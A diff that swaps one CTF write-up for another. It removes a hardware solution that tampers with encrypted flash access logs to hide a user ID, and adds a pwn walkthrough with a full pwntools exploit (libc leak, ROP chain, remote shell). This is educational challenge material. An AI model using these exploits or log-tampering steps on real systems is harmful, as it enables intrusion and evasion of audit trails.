@@ -1,454 +1,376 @@
 # Cyber Apocalypse 2024
 
-## Flash-ing Logs
+# Oracle | hard | pwn
 
-> After deactivating the lasers, you approach the door to the server room. It seems there's a secondary flash memory inside, storing the log data of every entry. As the system is air-gapped, you must modify the logs directly on the chip to avoid detection. Be careful to alter only the user_id = 0x5244 so the registered logs point out to a different user. The rest of the logs stored in the memory must remain as is.
-> 
-> Author: n/a
-> 
-> [`hardware_flashing-logs.zip`](hardware_flashing-logs.zip)
+> Traversing through the desert, you come across an Oracle. One of five in the entire arena, an oracle gives you the power to watch over the other competitors and send infinitely customizable plagues upon them. Deeming their powers to be too strong, the sadistic overlords that run the contest decided long ago that every oracle can backfire - and, if it does, you will wish a thousand times over that you had never been born. Willing to do whatever it takes, you break it open, risking eternal damnation for a chance to turn the tides in your favour.
 
-Tags: _hardware_
+## Enumeration
 
-## Solution
-For this challenge, we get again the `client` we already know from the [`Rids`](../rids/README.md) challenge. So its again the `W25Q128` flash memory. Reading the instruction, we are in a server room and the chip logs entry events to the server room. To hide our trail our challenge is to change the log entries of *our user id* to point to *another user id*.
+Download the given archive, extract, and let's dig inside. Oh sweet, we're given the source code in `C`.
 
-Perfect, we already know how to read data, so we just dump the memory and see where data is written. The main part of the data is uninitialized but first `2560` bytes contain information, so we can guess this is the log record-set.
+```
+-rwxrw-rw-  1 kali kali   92 Feb  2 09:53 build_docker.sh
+drwxr-xr-x  2 kali kali 4096 Mar 15 18:38 challenge
+-rwxrw-rw-  1 kali kali  158 Feb  2 09:52 Dockerfile
+-rwxrw-rw-  1 kali kali 7278 Feb 13 05:34 oracle.c
+```
+
+Let's analyze what happens inside the `Dockerfile` first and then we can check the source code.
+
+```bash
+└─$ cat Dockerfile                   
+FROM ubuntu:20.04
+
+RUN useradd -m ctf
+
+COPY challenge/* /home/ctf/
+
+RUN chown -R ctf:ctf /home/ctf/
+
+WORKDIR /home/ctf
+USER ctf
+
+EXPOSE 9001
+CMD ["./run.sh"]
+```
+
+Check the securities of the binary since we want to know what we're facing in a pwn challenge.
+
+```bash
+└─$ checksec oracle  
+[*] '/home/kali/htb_stuffz/ctf_2024/pwn_oracle/challenge/oracle'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+```
+
+And as we can see, it's dynamically linked, which means it depends on the presence of these libraries in the system environment.
+
+```bash
+└─$  file oracle
+oracle: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ab489f2c221f7a038087dbb2040dacac768865ab, for GNU/Linux 3.2.0, not stripped
+```
+
+Explaining one-by-one what we can identify here. `Partial RELRO` means that some parts of the binary are marked as read-only after relocation to prevent overwriting of certain sections of the binary. However, this is not that much of a problem since it doesn't protect the `GOT` (Global Offset Table) as the Full RELRO does. Stack canaries are not being used, making it easier to perform buffer overflow attacks without detections. No eXecute enabled means that pages marked as non-executable cannot be executed, which is a mitigation against executing shellcode placed on the stack or heap. Return-Oriented Programming (ROP) is a technique that can be used in these situations to bypass. PIE means the executable's code is loaded at a random base address, which is a form of ASLR at the binary level, making it more difficult to predict the address of specific functions or gadgets. In order to confirm this, we're going to check ASLR status.
+
+Hop into the local docker. This is assuming you've run the `./build_docker.sh`. Find out your container ID by running `docker ps`.
+
+```bash
+└─$ docker ps
+CONTAINER ID   IMAGE     COMMAND      CREATED       STATUS       PORTS                                       NAMES
+19dbe483fb3f   oracle    "./run.sh"   2 hours ago   Up 2 hours   0.0.0.0:9001->9001/tcp, :::9001->9001/tcp   oracle
+
+└─$ docker exec -t -i oracle /bin/bash
+ctf@19dbe483fb3f:~$ cat /proc/sys/kernel/randomize_va_space
+2
+```
+
+A value of `0` means ASLR is disabled, `1` means it's partially enabled (conservative randomization), and `2` or higher typically indicates full ASLR is enabled. The use of `PIE` with the `oracle` binary, as indicated by the `checksec` output, aligns with ASLR by ensuring that the binary's code is loaded at a random base address each time it's executed. This randomization makes it significantly more difficult to predict where code might execute, complicating exploits that rely on hardcoded or guessed memory addresses, such as those used in buffer overflow attacks.
+
+We can also quickly check the presence and version of libc version from the local environment since we've got access to it.
+
+```bash
+ctf@f0c3c0de7947:~$ ldd oracle
+        linux-vdso.so.1 (0x00007ffd315fd000)
+        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fa5cbd38000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007fa5cbf33000)
+
+/lib/x86_64-linux-gnu/libc.so.6
+GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.14) stable release version 2.31.
+
+<redacted>
+
+ctf@f0c3c0de7947:~$ ls -la /lib/x86_64-linux-gnu/
+total 25652
+
+<redacted>
+-rwxr-xr-x  1 root root 2029592 Nov 22 13:32 libc-2.31.so
+lrwxrwxrwx  1 root root      12 Nov 22 13:32 libc.so.6 -> libc-2.31.so
+<redacted>
+```
+
+It's pretty satisfying that we are provided with the entire source code without being required to reverse the binary. Looking into the `oracle.c` we can almost immediately identify the vulnerabilities. 
+
+The first and most obvious vulnerability that we will exploit is leaking the `libc`. This is possible due to the `handle_plague` function. This initial vulnerability within `handle_plague` arises from insufficient validation of user-supplied input, leading to a heap-based buffer overflow. This vulnerability is going to be the entry point for our exploit, allowing both the leakage of libc addresses and the injection of the ROP chain.
+
+Below we can see where the problem arises: the function dynamically allocates a buffer on the heap to store data received from client based on the Content-Length header. However, it fails to properly validate the size of this incoming data against the allocated buffer's capacity. This being fixed size based on `MAX_PLAGUE_CONTENT_SIZE` with that malloc(). This is a buffer overflow condition. Leaking arbitrary memory locations, such as libc addresses, undermines the ASLR, and provides us with the critical piece of the puzzle to construct the ROP chain. 
+
+Right from the given `oracle.c` source code, the `handle_plague()` function:
+
+```c
+void handle_plague() {
+    if(!get_header("Content-Length")) {
+        write(client_socket, CONTENT_LENGTH_NEEDED, strlen(CONTENT_LENGTH_NEEDED));
+        return;
+    }
+    
+    // take in the data
+    char *plague_content = (char *)malloc(MAX_PLAGUE_CONTENT_SIZE);
+    char *plague_target = (char *)0x0;
+
+    if (get_header("Plague-Target")) {
+        plague_target = (char *)malloc(0x40);
+        strncpy(plague_target, get_header("Plague-Target"), 0x1f);
+    } else {
+        write(client_socket, RANDOMISING_TARGET, strlen(RANDOMISING_TARGET));
+    }
+
+    long len = strtoul(get_header("Content-Length"), NULL, 10);
+
+    if (len >= MAX_PLAGUE_CONTENT_SIZE) {
+        len = MAX_PLAGUE_CONTENT_SIZE-1;
+    }
+
+    recv(client_socket, plague_content, len, 0);
+
+    if(!strcmp(target_competitor, "me")) {
+        write(client_socket, PLAGUING_YOURSELF, strlen(PLAGUING_YOURSELF));
+    } else if (!is_competitor(target_competitor)) {
+        write(client_socket, PLAGUING_OVERLORD, strlen(PLAGUING_OVERLORD));
+    } else { 
+        dprintf(client_socket, NO_COMPETITOR, target_competitor);
+
+        if (len) {
+            write(client_socket, plague_content, len);
+            write(client_socket, "\n", 1);
+        }
+    }
+
+    free(plague_content);
+
+    if (plague_target) {
+        free(plague_target);
+    }
+}
+```
+
+This is why we are going to approach this as a libc leak challenge. Our plan of attack is leak + ROP to effectively navigate around ASLR and PIE.
+
+The bug in the code is due to the fact it doesn't zero out the chunk's content before it ends up reused. The `MAX_PLAGUE_CONTENT_SIZE` is defined as 2048, which means that when it's freed, it's going to be placed into the unsorted bin. Without being cleared this chuck, it's going to hold a libc address. To exploit this, by calling `handle_plague()` twice where the second invocation we are going to send only a null byte after the headers. Any other approach would work fine too, just send minimal data. It's going to leverage the application's memory handling vulnerability and expose libc address retained in the memory.
+
+Here's how it turns out what we're trying to do:
+
+```
+Sending payload:
+b'PLAGUE blah blah\r\nContent-Length: 1000\r\nPlague-Target: blah\r\n\r\n\x00'
+Sending payload:
+b'PLAGUE blah blah\r\nContent-Length: 64\r\n\r\n\r\n\x00'
+Received data:  b'Randomising a target competitor, as you wish...\nNo such competitor blah exists. They may have fallen before you tried to plague them. Attempted plague: \r\n\x00W\x12\x7f\x00\x00\xe0\x1b2W\x12\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n'
+```
+
+The interesting part is after the Attempted plague, `\x00W\x12\x7f\x00\x00\xe0\x1b2W\x12\x7f\x00\x00`.
+
+The response needs to be parsed, extract the leaked adress from the payload and adjust accordingly. The next vulnerability that we're going to exploit is `parse_headers()` function. Right away we can identify the lack of bounds checking and insufficient input validation. The loop is going to read byte-by-byte the received content and stores them into the header_buffer, which is fixed sized (`MAX_HEADER_DATA_SIZE`). However, it doesn't check whether the `i` in the `while` loop is going to exceeed header_buffer. The break condition is only when `\r\n\r\n` is received, which marks the end of the header. However, this check happens _after_ writing the byte into the buffer. Check below the attached code snippet from the `oracle.c` source code. 
+
+```c
+void parse_headers() {
+    // first input all of the header fields
+    ssize_t i = 0;
+    char byteRead;
+    char header_buffer[MAX_HEADER_DATA_SIZE];
+
+    while (1) {
+        recv(client_socket, &byteRead, sizeof(byteRead), 0);
+
+        // clean up the headers by removing extraneous newlines
+        if (!(byteRead == '\n' && header_buffer[i-1] != '\r'))
+            header_buffer[i] = byteRead;
+
+        if (!strncmp(&header_buffer[i-3], "\r\n\r\n", 4)) {
+            header_buffer[i-4] == '\0';
+            break;
+        }
+
+        i++;
+    }
+    < redacted >
+}
+```
+As such we have everything what we need to build up our ROP chain. libc address is successfully leaked out, and we know where the overflow is happening. By crafting our ROP payload we can carefully overwrite control data on the stack like the saved return address of `parse_headers` and as such redirect execution flow. It is time to hook up to GDB. Disassemble the `parse_headers` functions, find its ret address, attach breakpoint there, and we can see the registers and stack content at the snapshot - right before we've returned from parse_headers function. Send again, second invocation as mentioned earlier, then check the state.
+
+In order to attach gdb to your docker environment, you need to edit the build_docker file a bit. The `-p 9090:9090` is going to map the host port to docker container and the `--capp-add=SYS_PTRACE` grants the container permissions for tracing system calls. This is required by gdb since it facilitates remote debugging.
+
+```bash
+└─$ cat build_docker.sh 
+#!/bin/sh
+docker build --tag=oracle .
+docker run -it -p 9001:9001 -p 9090:9090 --cap-add=SYS_PTRACE --rm --name=oracle oracle
+```
+
+Once this is done, you just connect to the docker container and install gdb-server and run `gdbserver :9090 --attach $(pidof oracle)`, you can also do these in Dockerfile.
+
+Have fun debugging.
+
+![image](https://github.com/respawnRW/writeups/assets/163560495/1e2d9054-53b9-4b02-9796-e41136d0e6d6)
+
+And let's not forget about the libc correct version, you extract that from docker container, in order to be sure.
+
+Next steps are the core of ROP chain construction. The memory address of `system` is what we are looking for, then we calculate the address of the gadget ending with `pop rdi; ret` As we discussed earlier this way we can control the value of the `rdi` register and manipulate execution flow. The second value is the register `rsi` which is going to be used as a second argument for our system function. Remember, we're planning to do `system('/bin/sh')`. `Next` function is going to retrieve the first occurence's address. Finally  the `dup2` system call within libc will be used to redirect standard i/o so we can interact with the spawned shell.
 
 ```python
-def debug_print_data_raw(data):
-    for i, b in enumerate(data):
-        print(f"{b:02X}", end=" ")
-        if (i+1)%16 == 0: print()
-    print()
+libc = ELF('./libc-2.31.so')
+libc.address = leak - 2018048  # Calculate the libc base address
+system_addr = libc.symbols['system']
+pop_rdi = libc.address + 0x0000000000023b6a
+pop_rsi = libc.address + 0x000000000002601f
+ret = libc.address + 0x0000000000022679
+binsh = next(libc.search(b'/bin/sh'))
+dup2 = libc.symbols['dup2']
+```
 
-def flash_write_disable():
-    res = exchange([0x04], 1)
-    
-def read_data(length, addr):
-    flash_write_disable()
+In networked exploits, unlike in local environments, we need to redirect the stdin/stdout of the process to the network socket to interact with the exploited service remotely. The `dup2` syscall achieves this by duplicating the socket's file descriptor (0x6 in this case) over stdin (0) and stdout (1). This redirection allows us to send commands and receive output over the network, enabling interactive access. This is what you will see when building up the payload for the ROP chain. 
 
-    cmd = [0] * 4
-    cmd[0] = 0x03
-    cmd[1] = (addr >> 16) & 0xff
-    cmd[2] = (addr >> 8)  & 0xff
-    cmd[3] = (addr >> 0)  & 0xff
+And here's how we put together the entire ROP payload. In the end we need to send `\r\n\r\n` as we seen from `parse_headers` function. We're going to fill the buffer up to the point of overflow with `A`'s. Prepare the first dup2 from 0x0 to 0x6, then we call the dup2 so it redirects input from socket. The same process is repeated with `pop_rsi, 0x1` in order to redirect the `stdout` as well with the help of `dup2` call. And as a last step, we are constructing how to call the `system('/bin/sh')`, first we place the address of the string into the `rdi` register it's going to be the argument of the call - i.e. what to call. Followed by a stack alignment gadget the `ret` and the `system_addr` function is being called which will in the end spawn the shell.
 
-    data = bytearray(exchange(cmd, length))
+```
+payload = flat(
+    b'A' * offset, pop_rdi, 0x6, pop_rsi, 0x0, dup2,
+    pop_rdi, 0x6, pop_rsi, 0x1, dup2,
+    pop_rdi, binsh, ret, system_addr  # Craft the final ROP chain to spawn a shell
+)
+io.send(payload + b'\r\n\r\n')
+```
 
+Find below the entire code that does the job done. The pwn script was adapted and comprehensively commented in great depth with multiple print statements during execution. Run it without any arguments to execute it locally or run it with REMOTE argument to have it run remotely.
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+# Set up the binary context for pwntools
+context.binary = elf = ELF('./oracle')
+context.log_level = 'error'  # Reduce output verbosity
+
+# Function to establish a connection with the target
+def get_connection():
+    # Connect to the remote target if specified, otherwise connect locally for testing
+    if args.REMOTE:
+        return remote("94.237.54.170", 47106)
+    else:
+        return remote("localhost", 9001)
+
+# Function to send the PLAGUE command with controlled parameters
+def plague(target_competitor: str, include_plague_target: bool, content_length: int = 1000):
+    io = get_connection()
+    # Construct the command with the target competitor's name
+    command = b'PLAGUE ' + target_competitor.encode() + b' blah\r\n'
+    # Specify the Content-Length header for the subsequent data
+    content_length_header = b'Content-Length: ' + str(content_length).encode() + b'\r\n'
+    # Conditionally include the Plague-Target header based on the flag
+    plague_target_header = b'Plague-Target: blah' if include_plague_target else b''
+    # End of headers and start of the actual data payload
+    end_of_headers = b'\r\n\r\n'
+    # The null byte to indicate the end of the request
+    end_of_request = b'\x00'
+
+    # Combine all parts to form the full payload
+    full_payload = command + content_length_header + plague_target_header + end_of_headers + end_of_request
+
+    # Print the payload being sent
+    print("Sending payload:")
+    print(full_payload)
+
+    # Send the constructed payload
+    io.send(full_payload)
+    data = io.recvline()
+    if not include_plague_target:
+        data += io.recvline()
+        data += io.recvline()
+    io.close()
     return data
 
-if __name__ == "__main__":
-    debug_print_data_raw(read_data(1024*4, 0x0))
+# Trigger the vulnerability and receive the initial leak
+plague("blah", True)
+data = plague("blah", False, content_length=64)
+print(f"Received data: ", data)
+
+# Extract the leaked libc address and adjust it
+leak = u64(data.split(b": ")[1][9:17])
+print(f"Raw leaked libc address: {hex(leak)}")
+leak = leak << 8  # Adjust the leaked address
+print(f"Leaked libc address (adjusted): {hex(leak)}")
+
+# Calculate libc base and other function/gadget addresses
+libc = ELF('./libc-2.31.so')
+libc.address = leak - 2018048  # Calculate the libc base address
+system_addr = libc.symbols['system']
+pop_rdi = libc.address + 0x0000000000023b6a
+pop_rsi = libc.address + 0x000000000002601f
+ret = libc.address + 0x0000000000022679
+binsh = next(libc.search(b'/bin/sh'))
+dup2 = libc.symbols['dup2']
+
+# Print calculated addresses for debugging
+print(f"system() address: {hex(system_addr)}")
+print(f"pop_rdi gadget address: {hex(pop_rdi)}")
+print(f"pop_rsi gadget address: {hex(pop_rsi)}")
+print(f"ret gadget address: {hex(ret)}")
+print(f"'/bin/sh' string address: {hex(binsh)}")
+print(f"dup2 function address: {hex(dup2)}")
+
+# Establish a connection and prepare for payload delivery
+offset = 2127  # Buffer offset to control return address
+io = get_connection()
+io.send(b'VIEW me 1.0\r\n')
+
+# Pause before sending the payload for manual intervention or review
+input("Press any key to send the payload...")
+
+# Construct and send the payload for exploitation
+payload = flat(
+    b'A' * offset, pop_rdi, 0x6, pop_rsi, 0x0, dup2,
+    pop_rdi, 0x6, pop_rsi, 0x1, dup2,
+    pop_rdi, binsh, ret, system_addr  # Craft the final ROP chain to spawn a shell
+)
+io.send(payload + b'\r\n\r\n')
+io.interactive()  # Switch to interactive mode after sending the payload
+io.close()  # Close the connection after exploitation
 ```
 
+Don't forget to run the docker build and have it running locally in your environment. 
+
 ```
-$ python client.py
-87 74 D8 FC 23 5D C1 8B 6D 07 48 53 98 D4 5D 17
-24 A0 D9 FC DF 5D 91 8A 6E 07 48 53 DB CD EE C3
-37 B2 DE FC 4A 5D E2 89 6F 07 48 53 EB 4C E4 B9
-F9 A8 DE FC 23 5D 46 8A 6E 07 48 53 77 2E 1D FE
-AF 3D DE FC 4A 5D E2 89 6E 07 48 53 35 1E 92 8F
-DA 36 DE FC 7A 5D EB 88 6F 07 48 53 F5 23 44 37
-F5 CA DF FC DF 5D D5 8A 6F 07 48 53 BC 25 E7 97
-A9 71 DF FC EC 5D D5 8A 6E 07 48 53 0D F8 C2 61
-49 BA DC FC EC 5D 7D 8A 6E 07 48 53 51 78 A7 B5
-06 7D DC FC 2D 5D C1 8B 6F 07 48 53 51 B3 1A 21
-...
-1A 1B 7F FF F0 5D BA DB 6D 07 48 53 CF 5B 6C 85
-86 2D 7F FF 9D 5D BA DB 6F 07 48 53 EC 68 81 CD
-DA CB 7C FF 9D 5D BA DB 6F 07 48 53 86 AD 47 D0
-D6 A1 7C FF F0 5D BA DB 6F 07 48 53 D1 9B D8 2C
-FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF
-FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF
-FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF
-FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF
-FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF
-FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF
-FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF
-FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF
-...
+Sending payload:
+b'PLAGUE blah blah\r\nContent-Length: 1000\r\nPlague-Target: blah\r\n\r\n\x00'
+Sending payload:
+b'PLAGUE blah blah\r\nContent-Length: 64\r\n\r\n\r\n\x00'
+Received data:  b'Randomising a target competitor, as you wish...\nNo such competitor blah exists. They may have fallen before you tried to plague them. Attempted plague: \r\n\x00W\x12\x7f\x00\x00\xe0\x1b2W\x12\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n'
+Raw leaked libc address: 0x7f1257321b
+Leaked libc address (adjusted): 0x7f1257321b00
+system() address: 0x7f1257187290
+pop_rdi gadget address: 0x7f1257158b6a
+pop_rsi gadget address: 0x7f125715b01f
+ret gadget address: 0x7f1257157679
+'/bin/sh' string address: 0x7f12572e95bd
+dup2 function address: 0x7f1257243ae0
+Press any key to send the payload...
+You have found yourself.
+$ whoami
+ctf
+$ cat flag.txt
+HTB{f4k3_fL4G_f0R_t3sTiNg}
 ```
 
-Next up is to actually understand the data. For this the challenge gives us the routines which are used to write the data.
+Finally, we can run our script on the remote, achieve shell, and grab the flag.
 
-```c
-#define KEY_SIZE 12 // Size of the key
+![image](https://github.com/respawnRW/writeups/assets/163560495/140d98ba-573a-4f4c-8ad3-acca9e760011)
 
-// encrypts log events
-void encrypt_data(uint8_t *data, size_t data_length, uint8_t register_number, uint32_t address) {
-    uint8_t key[KEY_SIZE];
+The "live" flag in plaintext: `HTB{wH4t_d1D_tH3_oRAcL3_s4y_tO_tH3_f1gHt3r?}`
 
-    read_security_register(register_number, 0x52, key); // register, address
 
-    printf("Data before encryption (including CRC):\n");
-    for(size_t i = 0; i < data_length; ++i) {
-        printf("%02X ", data[i]);
-    }
-    printf("\n");
+Hope you enjoyed.
 
-    // Print the CRC32 checksum before encryption (assuming the original data includes CRC)
-    uint32_t crc_before_encryption = calculateCRC32(data, data_length - CRC_SIZE);
-    printf("CRC32 before encryption: 0x%08X\n", crc_before_encryption);
+Over and out,
 
-    // Apply encryption to data, excluding CRC, using the key
-    for (size_t i = 0; i < data_length - CRC_SIZE; ++i) { // Exclude CRC data from encryption
-        data[i] ^= key[i % KEY_SIZE]; // Cycle through  key bytes
-    }
+`--RW`
 
-    printf("Data after encryption (including CRC):\n");
-    for(size_t i = 0; i < data_length; ++i) {
-        printf("%02X ", data[i]);
-    }
-    printf("\n");
+## Resources
 
+https://book.hacktricks.xyz/reversing-and-exploiting/linux-exploiting-basic-esp/rop-leaking-libc-address
 
-}
+https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming
 
-void write_to_flash(uint32_t sector, uint32_t address, uint8_t *data, size_t length) {
-    printf("Writing to flash at sector %u, address %u\n", sector, address);
-
-    uint8_t i;
-    uint16_t n;
-
-    encrypt_data(data, length, 1, address);
-
-    n =  W25Q128_pageWrite(sector, address, data, 16);
-    printf("page_write(0,10,d,26): n=%d\n",n);
-
-}
-```
-
-We can see, data is written encrypted to a certain address. The encryption is a fairly easy xor encryption with a 12 byte wide key. Also every log entry ends with a crc32 value of the entry data, but the crc32 value is not encrypted. Interestingly, the key is read from a security register, so wie consult our [`documentation`](https://docs.rs-online.com/9bfc/0900766b81704060.pdf) about this.
-
-> **Read Security Registers (48h)**
-> The Read Security Register instruction is similar to the Fast Read instruction and allows one or more data
-> bytes to be sequentially read from one of the three security registers. The instruction is initiated by driving
-> the /CS pin low and then shifting the instruction code “48h” followed by a 24-bit address (A23-A0) and
-> eight “dummy” clocks into the DI pin. The code and address bits are latched on the rising edge of the CLK
-> pin. After the address is received, the data byte of the addressed memory location will be shifted out on
-> the DO pin at the falling edge of CLK with most significant bit (MSB) first. The byte address is
-> automatically incremented to the next byte address after each byte of data is shifted out. Once the byte
-> address reaches the last byte of the register (byte address FFh), it will reset to address 00h, the first byte
-> of the register, and continue to increment. The instruction is completed by driving /CS high. The Read
-> Security Register instruction sequence is shown in Figure 46. If a Read Security Register instruction is
-> issued while an Erase, Program or Write cycle is in process (BUSY=1) the instruction is ignored and will
-> not have any effects on the current cycle. The Read Security Register instruction allows clock rates from
-> D.C. to a maximum of FR (see AC Electrical Characteristics). 
->
-> `Address                A23-16    A15-12      A11-8       A7-0`
-> `Security Register #1   00h       0 0 0 1     0 0 0 0     Byte address`
-> `Security Register #2   00h       0 0 1 0     0 0 0 0     Byte address`
-> `Security Register #3   00h       0 0 1 1     0 0 0 0     Byte address`
-
-All in all our command we need to send looks like this:
-
-```python
-def read_encryption_key():
-    # 0x48    => Read Security Register
-    # A32-16  => 0
-    # A15-8   => 00010000 (16) register #1
-    # A7-0    => address taken from log_event.c
-    return bytearray(exchange([0x48, 0, 16, 0x52, 0, 0], 12))
-```
-
-This gives us the key, so we can now decrypt the data we read. But we still need to know how the log data is layed out in memory. This, we can again, read from log_event.c.
-
-```c
-// SmartLockEvent structure definition
-typedef struct {
-    uint32_t timestamp;   // Timestamp of the event
-    uint8_t eventType;    // Numeric code for type of event // 0 to 255 (0xFF)
-    uint16_t userId;      // Numeric user identifier // 0 t0 65535 (0xFFFF)
-    uint8_t method;       // Numeric code for unlock method
-    uint8_t status;       // Numeric code for status (success, failure)
-} SmartLockEvent;
-
-// Implementations
-int log_event(const SmartLockEvent event, uint32_t sector, uint32_t address) {
-
-    bool memory_verified = false;
-    uint8_t i;
-    uint16_t n;
-    uint8_t buf[256];
-
-
-    memory_verified = verify_flashMemory();
-    if (!memory_verified) return 0;
-
-     // Start Flash Memory
-    W25Q128_begin(SPI_CHANNEL);
-
-
-    // Erase data by Sector
-    if (address == 0){
-        printf("ERASE SECTOR!");
-        n = W25Q128_eraseSector(0, true);
-        printf("Erase Sector(0): n=%d\n",n);
-        memset(buf,0,256);
-        n =  W25Q128_read (0, buf, 256);
-
-    }
-
-    uint8_t buffer[sizeof(SmartLockEvent) + sizeof(uint32_t)]; // Buffer for event and CRC
-    uint32_t crc;
-
-    memset(buffer, 0, sizeof(SmartLockEvent) + sizeof(uint32_t));
-
-    // Serialize the event
-    memcpy(buffer, &event, sizeof(SmartLockEvent));
-
-    // Calculate CRC for the serialized event
-    crc = calculateCRC32(buffer, sizeof(SmartLockEvent));
-
-    // Append CRC to the buffer
-    memcpy(buffer + sizeof(SmartLockEvent), &crc, sizeof(crc));
-
-
-    // Print the SmartLockEvent for debugging
-    printf("SmartLockEvent:\n");
-    printf("Timestamp: %u\n", event.timestamp);
-    printf("EventType: %u\n", event.eventType);
-    printf("UserId: %u\n", event.userId);
-    printf("Method: %u\n", event.method);
-    printf("Status: %u\n", event.status);
-
-    // Print the serialized buffer (including CRC) for debugging
-    printf("Serialized Buffer (including CRC):");
-    for (size_t i = 0; i < sizeof(buffer); ++i) {
-        if (i % 16 == 0) printf("\n"); // New line for readability every 16 bytes
-        printf("%02X ", buffer[i]);
-    }
-    printf("\n");
-
-
-    // Write the buffer to flash
-    write_to_flash(sector, address, buffer, sizeof(buffer));
-
-
-    // Read 256 byte data from Address=0
-    memset(buf,0,256);
-    n =  W25Q128_read(0, buf, 256);
-    printf("Read Data: n=%d\n",n);
-    dump(buf,256);
-
-    return 1;
-}
-```
-
-So our data is build like this:
-
-```bash
-00-03   Timestamp
-04      Event-Type
-05-06   User-Id
-07      Method
-08      Status
-```
-
-So, 9 bytes in total. But.. Not so fast, we cannot forget data alignment. The compiler will typically fill in padding bytes to make data access more efficient. So the *actual* layout is:
-
-```bash
-00-03   Timestamp
-04      Event-Type
-05      Padding1
-06-07   User-Id
-08      Method
-09      Status
-0A-0C   Padding2
-```
-
-So we have `12` bytes of log entry data plus `4` bytes for the checksum, in total one record is `16` bytes. Knowing this, we can now interpret the encrypted data fully.
-
-```python
-def process_data(data, key, /, modify, dump):
-    # data records are 16 bytes each
-    # 12 bytes 'SmartLockEvent' struct data
-    #  4 bytes crc32
-    for i in range(0, len(data), 16):
-        record = bytearray([data[x] for x in range(i,i+12)])
-
-        # decrypt record data (crc is not encrypted)
-        for j in range(0, 12):
-            record[j] = record[j] ^ key[j%len(key)]
-
-        timestamp = struct.unpack_from("<I", record, offset=0)[0]
-        event_id = record[4]
-        user_id = struct.unpack_from("<H", record, offset=6)[0]
-        method = record[8]
-        success = record[9]
-        crc = struct.unpack_from("<I", data, offset=i+12)[0]
-
-        # unpack data for debug print
-        if dump == True:
-            print(f"[{i:04d}]: {timestamp}, {event_id:03d}, {user_id:04X}, {method}, {success}, {crc:08X}")
-
-        # ...
-
-if __name__ == "__main__":
-    key = read_encryption_key()
-
-    records = read_data(RECORDS_SIZE, 0)
-
-    process_data(records, key, modify = False, dump = True)
-```
-
-This gives us the fully decoded log entry and, we can see, the last 4 log items are for our user (user-id: 0x5244). 
-```bash
-$ python client.py
-[0000]: 1706207934, 005, 023F, 1, 1, 175DD498
-[0016]: 1706262045, 249, 036F, 2, 1, C3EECDDB
-[0032]: 1706322958, 108, 001C, 3, 1, B9E44CEB
-[0048]: 1706325696, 005, 03B8, 2, 1, FE1D2E77
-[0064]: 1706353558, 108, 001C, 2, 1, 8F921E35
-[0080]: 1706354915, 092, 0115, 3, 1, 374423F5
-[0096]: 1706366156, 249, 032B, 3, 1, 97E725BC
-[0112]: 1706405776, 202, 032B, 2, 1, 61C2F80D
-[0128]: 1706452080, 202, 0383, 2, 1, B5A77851
-[0144]: 1706468159, 011, 023F, 3, 1, 211AB351
-[0160]: 1706509360, 011, 0383, 1, 1, 4823C30F
-[0176]: 1706609565, 187, 023F, 3, 1, 97FF08BF
-[0192]: 1706680365, 108, 03B0, 1, 1, DD390AC5
-[0208]: 1706755056, 005, 0383, 1, 1, E842E5CF
-...
-[2480]: 1712644769, 215, 023F, 2, 1, CE1CC663
-[2496]: 1712702755, 214, 5244, 1, 1, 856C5BCF
-[2512]: 1712714687, 187, 5244, 3, 1, CD8168EC
-[2528]: 1712723427, 187, 5244, 3, 1, D047AD86
-[2544]: 1712750575, 214, 5244, 3, 1, 2CD89BD1
-```
-
-So we have to change this to another user. Since we have the data in memory anyways we can just do so (and also update the checksum, while we are at it).
-
-```python
-def process_data(data, key, /, modify, dump):
-  ...
-  # modify the user with id 0x5244 to target another user
-  if modify == True and user_id == 0x5244:
-      struct.pack_into("<H", record, 6, 944)
-      crc = binascii.crc32(record)
-      for j in range(len(record)):
-          data[i+j] = record[j] ^ key[j%len(key)]
-      struct.pack_into("<I", data, i+12, crc)
-
-if __name__ == "__main__":
-    key = read_encryption_key()
-
-    records = read_data(RECORDS_SIZE, 0)
-
-    process_data(records, key, modify = False, dump = True)
-
-    # process data and modify user records
-    process_data(records, key, modify = True, dump = False)
-
-    if DEBUG == True:
-        # just dump the processed data to check everything is fine
-        process_data(records, key, modify = False, dump = True)
-```
-
-So, what we are doing up to this point. We read the encryption key from `security register 1`, we read, decrypt and decode the log data. Then we update the user-id of the log entries which are associated to user `0x5244`, update the crc and encrypt the data again. 
-
-The next step will be to write back the updated data. So we go back to our [`documentation`](https://docs.rs-online.com/9bfc/0900766b81704060.pdf) and see how we can do that.
-
-> **Page Program (02h)**
-> The Page Program instruction allows from one byte to 256 bytes (a page) of data to be programmed at
-> previously erased (FFh) memory locations. A Write Enable instruction must be executed before the device
-> will accept the Page Program Instruction (Status Register bit WEL= 1). The instruction is initiated by
-> driving the /CS pin low then shifting the instruction code “02h” followed by a 24-bit address (A23-A0) and
-> at least one data byte, into the DI pin. The /CS pin must be held low for the entire length of the instruction
